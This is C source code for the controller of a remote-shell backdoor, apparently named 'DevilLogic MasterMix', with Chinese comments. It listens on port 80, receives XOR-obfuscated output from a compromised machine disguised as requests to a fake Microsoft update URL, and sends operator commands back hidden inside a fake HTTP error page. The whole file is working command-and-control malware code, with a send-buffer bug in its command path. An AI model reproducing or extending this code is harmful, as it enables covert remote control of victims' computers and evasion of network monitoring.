#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define TKey	0x99

int main(void)
{
   	WSADATA              wsaData;
   	SOCKET               ListeningSocket;
   	SOCKET               NewConnection;
   	SOCKADDR_IN          ServerAddr;
   	SOCKADDR_IN          ClientAddr;
   	int                  ClientAddrLen;
   	int                  Port = 80;
   	int                  Ret;
	int		     i;
	char		     szSendBuf[0x500]={0};
	char		     szRecvBuf[0x500]={0};
	char		     szBuffer[0x500]={0};

	char		     szURLTitle[] = "GET http:////www.microsoft.com//updata//Search.aspx?displaylang=en&&upid=";					
	char		     szCmdTitle[]="<h1>Bad Request (Invalid Verb)<//h1>\n";

	int URLsize = strlen(szURLTitle);
	int CmdTitlesize = strlen(szCmdTitle);
	char *bptr, *tptr;
	
	printf("\t-=DevilLogic MasterMix 1.0.0=-\r\n");
	printf("<Author:logic.yan>.\r\n");
	printf("======================================================\r\n");
	if((Ret = WSAStartup(MAKEWORD(2,2), &wsaData)) != 0)	
	{
		printf("WSAStartup 创建失败. 错误代码:<%d>\r\n", Ret);
		return;
	}/* end if */	

	/* 创建套接字 */
   	if ((ListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) 
       		== INVALID_SOCKET)
   	{
      		printf("socket 套接字创建失败. 错误代码:<%d>\n", WSAGetLastError());
      		WSACleanup();
      		return;
   	}/* end if */
 
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_port = htons(Port);
	ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	
   	if (bind(ListeningSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) 
       		== SOCKET_ERROR)
   	{
      		printf("bind 绑定失败. 错误代码:<%d>\n", WSAGetLastError());
      		closesocket(ListeningSocket);
      		WSACleanup();
      		return;
   	}/* end if */
	
   	if (listen(ListeningSocket, 5) == SOCKET_ERROR)
   	{
      		printf("listen 监听失败. 错误代码:<%d>\n", WSAGetLastError());
      		closesocket(ListeningSocket);
      		WSACleanup();
      		return;
   	}/* end if */

   	printf("在端口 <%d> 等待连接.\n", Port);	
	
   	if ((NewConnection = accept(ListeningSocket, (SOCKADDR *) &ClientAddr,
                               &ClientAddrLen)) == INVALID_SOCKET)
   	{
      		printf("accept 接受失败. 错误代码:<%d>\n", WSAGetLastError());
      		closesocket(ListeningSocket);
      		WSACleanup();
      		return;
   	}/* end if */
	
   	printf("成功获取一个连接从 %s:%d.\n",
          	inet_ntoa(ClientAddr.sin_addr), ntohs(ClientAddr.sin_port));
	
	/* 开始接受数据 */
	while(1)
	{	/* 接受新的当前目录行 */
		memset(szSendBuf, 0, 0x500);
		memset(szRecvBuf, 0, 0x500);
		memset(szBuffer, 0, 0x500);
   		if ((Ret = recv(NewConnection, szRecvBuf, sizeof(szRecvBuf), 0)) 
       			== SOCKET_ERROR)
   		{
      			printf("recv 接收数据失败. 错误代码:<%d>\n", WSAGetLastError());
      			closesocket(NewConnection);
      			WSACleanup();
      			return;
   		}/* end if */
		/* 解密数据 */		
		bptr = szRecvBuf + URLsize;
		Ret = Ret - URLsize;
		for(i=0;i<Ret;i++)
		{
			szBuffer[i] = *(bptr+i) ^ TKey;
		}/* end for */
		/* 显示当前路径 */
		printf("%s", szBuffer);
		/* 发送命令 */
		memset(szBuffer, 0, 0x500);
		scanf("%s", szBuffer);
		Ret = strlen(szBuffer);	/* 命令的长度 */
		/* 构键发送缓冲 */
		strcpy(szSendBuf, szCmdTitle);
		strcat(szSendBuf, szBuffer);
		bptr = szSendBuf + CmdTitlesize;
		tptr = bptr;
		/* 加密命令 */
		for(i=0;i<Ret;i++)
		{
			*(tptr+i) = *(bptr+i) ^ TKey;
		}/* end for */
		/* 发送命令 */
		i = strlen(szSendBuf);		/* i为发送长度 */
   		if ((Ret = send(NewConnection, szBuffer, i, 0)) == SOCKET_ERROR)
   		{
      			printf("send 发送数据失败. 错误代码:<%d>\n", WSAGetLastError());
      			closesocket(NewConnection);
      			WSACleanup();
      			return;
   		}/* end if */
		/* 接受执行命令返回结果 */
		memset(szBuffer, 0, 0x500);
		memset(szRecvBuf, 0, 0x500);
   		if ((Ret = recv(NewConnection, szRecvBuf, sizeof(szRecvBuf), 0)) 
       			== SOCKET_ERROR)
   		{
      			printf("recv 接收数据失败. 错误代码:<%d>\n", WSAGetLastError());
      			closesocket(NewConnection);
      			WSACleanup();
      			return;
   		}/* end if */
		/* 解密数据 */		
		bptr = szRecvBuf + URLsize;
		Ret = Ret - URLsize;
		for(i=0;i<Ret;i++)
		{
			szBuffer[i] = *(bptr+i) ^ TKey;
		}/* end for */
		/* 显示当前路径 */
		printf("%s\r\n", szBuffer);				
	}/* end while */
     	closesocket(ListeningSocket);
     	closesocket(NewConnection);
      	WSACleanup();
	return 0;		
}/* end main */





















